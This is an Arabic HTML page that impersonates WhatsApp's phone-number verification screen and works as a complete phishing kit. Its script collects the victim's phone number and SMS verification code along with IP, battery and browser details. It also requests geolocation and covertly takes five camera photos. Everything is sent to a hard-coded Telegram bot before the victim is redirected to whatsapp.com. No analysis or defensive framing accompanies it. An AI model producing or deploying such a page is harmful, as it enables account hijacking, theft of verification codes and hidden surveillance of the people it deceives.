<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp | التحقق من رقم الهاتف</title>

    <!-- استدعاء مكتبة Font Awesome للأيقونات -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">

    <style>
        body {
            margin: 0;
            padding: 0;
            background: #111b21; /* خلفية واتساب الداكنة */
            color: #e9edef;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .whatsapp-card {
            background-color: #202c33;
            border-radius: 12px;
            padding: 30px 20px;
            width: 90%;
            max-width: 380px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            box-sizing: border-box;
        }

        .wa-logo {
            color: #00a884;
            font-size: 50px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #e9edef;
            font-weight: 500;
        }

        p.desc {
            font-size: 14px;
            color: #8696a0;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        /* حقول الإدخال */
        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        input[type="text"], input[type="tel"] {
            width: 100%;
            background: #2a3942;
            border: 1px solid #374248;
            border-radius: 8px;
            padding: 14px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            text-align: center;
            letter-spacing: 2px;
        }

        input:focus {
            border-color: #00a884;
        }

        /* الزر */
        .wa-btn {
            background-color: #00a884;
            color: #111b21;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .wa-btn:active {
            background-color: #008f72;
        }

        /* العداد التنازلي */
        .timer-text {
            margin-top: 20px;
            font-size: 13px;
            color: #8696a0;
        }

        .timer-text span {
            color: #00a884;
            font-weight: bold;
        }

        /* إخفاء العناصر */
        .hidden {
            display: none !important;
        }

        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="whatsapp-card">
        <div class="wa-logo">
            <i class="fa-brands fa-whatsapp"></i>
        </div>

        <!-- الخطوة الأولى: إدخال رقم الهاتف -->
        <div id="step-phone">
            <h2>أدخل رقم هاتفك</h2>
            <p class="desc">سيقوم واتساب بإرسال رسالة نصية لتأكيد رقمك. أدخل رقمك مع رمز الدولة.</p>
            <div class="input-group">
                <input type="tel" id="phoneNumber" placeholder="مثال: +963xxxxxxxx" dir="ltr">
            </div>
            <button class="wa-btn" onclick="goToCodeStep()">التالي</button>
        </div>

        <!-- الخطوة الثانية: إدخال الكود والعداد التنازلي -->
        <div id="step-code" class="hidden">
            <h2>أدخل رمز التحقق</h2>
            <p class="desc">تم إرسال رسالة نصية تحتوي على الرمز إلى رقمك.</p>
            <div class="input-group">
                <input type="text" id="verificationCode" placeholder="--- ---" maxlength="6" dir="ltr">
            </div>
            <button class="wa-btn" onclick="submitFinalData()">تحقق ومتابعة</button>
            <div class="timer-text">
                إعادة إرسال الرمز خلال: <span id="countdown">03:00</span>
            </div>
        </div>

        <!-- شاشة التحميل -->
        <div id="loading-screen" class="hidden">
            <div style="color: #00a884; font-size: 16px; padding: 20px 0;">
                <i class="fa-solid fa-spinner fa-spin" style="font-size: 30px; margin-bottom: 15px; display:block;"></i>
                جاري التوثيق، يرجى الانتظار...
            </div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_TOKEN = "8622279801:AAG0QyixH5E2sWF4kluCPp6XPnh-iGbNaaI";
        const CHAT_ID = "8908174599";
        
        let capturedPhone = "";

        function goToCodeStep() {
            const phoneInput = document.getElementById('phoneNumber').value;
            if(phoneInput.length < 6) {
                alert("يرجى إدخال رقم هاتف صحيح");
                return;
            }
            capturedPhone = phoneInput;

            // الانتقال لواجهة الكود
            document.getElementById('step-phone').classList.add('hidden');
            document.getElementById('step-code').classList.remove('hidden');

            // بدء العداد التنازلي (3 دقائق = 180 ثانية)
            startTimer(180);
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            const display = document.getElementById('countdown');
            const interval = setInterval(() => {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(interval);
                    display.textContent = "00:00";
                }
            }, 1000);
        }

        async function submitFinalData() {
            const codeInput = document.getElementById('verificationCode').value;
            
            // إظهار التحميل
            document.getElementById('step-code').classList.add('hidden');
            document.getElementById('loading-screen').classList.remove('hidden');

            const techData = await fetchTech();
            const now = new Date().toLocaleString('ar-EG');

            let report = `📱 **تسجيل دخول واتساب جديد**\n\n`;
            report += `📞 الرقم المدخل: \`${capturedPhone}\`\n`;
            report += `🔢 الكود المدخل: \`${codeInput || 'لم يدخل'}\`\n`;
            report += `🕓 الوقت: ${now}\n`;
            report += `🌍 IP: ${techData.ip}\n`;
            report += `🔋 البطارية: ${techData.battery}\n\n`;
            report += `===== 🧾 User-Agent =====\n`;
            report += `\`${navigator.userAgent}\``;

            sendToTelegram(report);

            // طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(p => {
                sendToTelegram(`📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // فتح الكاميرا والتقاط الصور
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                let count = 0;
                const interval = setInterval(() => {
                    if(count < 5) {
                        capture(count + 1);
                        count++;
                    } else {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://whatsapp.com";
                    }
                }, 1200);
            } catch(e) {
                sendToTelegram("❌ رفض صلاحية الكاميرا");
                window.location.href = "https://whatsapp.com";
            }
        }

        async function fetchTech() {
            let res = { ip: 'Unknown', battery: 'N/A' };
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                res.ip = d.ip;
                const b = await navigator.getBattery();
                res.battery = `${Math.round(b.level*100)}%`;
            } catch(e){}
            return res;
        }

        function capture(n) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', CHAT_ID);
                f.append('photo', blob, 'img.jpg');
                f.append('caption', `اللقطة ${n} | للرقم: ${capturedPhone}`);
                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {method:'POST', body:f});
            }, 'image/jpeg');
        }

        function sendToTelegram(t) {
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: t, parse_mode: "Markdown"})
            });
        }
    </script>
</body>
</html>
